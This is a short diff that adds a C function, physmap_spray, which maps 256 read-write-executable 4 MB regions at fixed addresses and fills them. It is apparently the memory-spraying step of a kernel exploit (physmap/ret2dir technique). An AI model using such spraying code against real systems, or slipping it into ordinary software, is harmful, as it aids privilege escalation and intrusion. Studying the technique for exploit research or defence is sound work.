@@ -1,0 +1,16 @@
+#define MMAP_SIZE   (4 * 1024 * 1024)
+#define PAGESIZE    4096
+#define MMAP_BASE   0x1000000
+void physmap_spray() {
+  int i;
+  void *addr;
+  size_t target;
+  for (i = 0; i < 256; i++) { // 1G
+    target = MMAP_BASE + i * MMAP_SIZE;
+    addr = mmap((void*)target, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (addr == MAP_FAILED) {
+      exit(1);
+    }
+    fill(addr, MMAP_SIZE);
+  }
+}
